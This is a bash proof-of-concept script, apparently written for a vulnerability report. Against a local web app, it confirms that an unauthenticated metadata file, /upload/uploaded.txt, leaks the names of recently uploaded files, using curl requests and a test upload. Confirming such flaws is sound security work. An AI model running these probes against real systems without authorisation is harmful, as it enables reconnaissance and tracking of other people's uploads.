#!/bin/bash

# POC: Information Disclosure via Publicly Accessible Metadata File
# This script demonstrates how the uploaded.txt file leaks information about recently uploaded files

TARGET="http://localhost:8080"
UPLOAD_ENDPOINT="$TARGET/index.php"
METADATA_FILE="$TARGET/upload/uploaded.txt"

echo "[*] Information Disclosure via uploaded.txt POC"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Check if metadata file is accessible
echo "[TEST 1] Attempting to access uploaded.txt metadata file..."
echo "Command: curl -s $METADATA_FILE"
echo ""

METADATA_RESPONSE=$(curl -s "$METADATA_FILE")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$METADATA_FILE")

if [ "$HTTP_CODE" -eq 200 ]; then
    echo "[+] SUCCESS: Metadata file is publicly accessible (HTTP 200)"
    echo "[+] Current leaked filename: $METADATA_RESPONSE"
    echo ""
else
    echo "[-] Failed to access metadata file (HTTP $HTTP_CODE)"
    exit 1
fi

# Test 2: Upload a file with a sensitive filename and verify it appears in metadata
echo "[TEST 2] Uploading a file with sensitive naming pattern..."

# Create a temporary test file
TEST_FILE="/tmp/test_sensitive_$(date +%s).jpg"
echo "fake JPEG content" > "$TEST_FILE"

# Upload the file
UPLOAD_RESPONSE=$(curl -s -F "file=@$TEST_FILE" "$UPLOAD_ENDPOINT")
UPLOADED_FILENAME=$(basename "$TEST_FILE")

echo "[*] Uploaded file: $UPLOADED_FILENAME"
echo "[*] Upload response received"
echo ""

# Wait a moment for file to be processed
sleep 1

# Check if the filename appears in metadata
echo "[TEST 3] Verifying uploaded filename appears in metadata file..."
echo "Command: curl -s $METADATA_FILE"
echo ""

NEW_METADATA=$(curl -s "$METADATA_FILE")
echo "[+] Leaked filename from uploaded.txt: $NEW_METADATA"

if [[ "$NEW_METADATA" == *"test_sensitive"* ]]; then
    echo "[+] SUCCESS: Uploaded filename is leaked in metadata file"
    echo "[+] VULNERABILITY CONFIRMED: Unauthenticated users can track uploaded filenames"
else
    echo "[*] Note: Filename may have been modified by the application"
fi

echo ""

# Test 3: Demonstrate unauthenticated access
echo "[TEST 4] Confirming metadata file is accessible without authentication..."
HTTP_CODE_NOAUTH=$(curl -s -o /dev/null -w "%{http_code}" "$METADATA_FILE")

if [ "$HTTP_CODE_NOAUTH" -eq 200 ]; then
    echo "[+] SUCCESS: Metadata file accessible without any authentication (HTTP $HTTP_CODE_NOAUTH)"
    echo "[+] VULNERABILITY CONFIRMED: Information disclosure to unauthenticated users"
else
    echo "[-] Metadata file requires authentication (HTTP $HTTP_CODE_NOAUTH)"
fi

echo ""
echo "[SUMMARY]"
echo "- Metadata file location: /upload/uploaded.txt"
echo "- Accessibility: Public (no authentication required)"
echo "- Information leaked: Recently uploaded filenames"
echo "- Impact: User activity tracking, filename pattern analysis, reconnaissance"
echo ""

# Cleanup
rm -f "$TEST_FILE"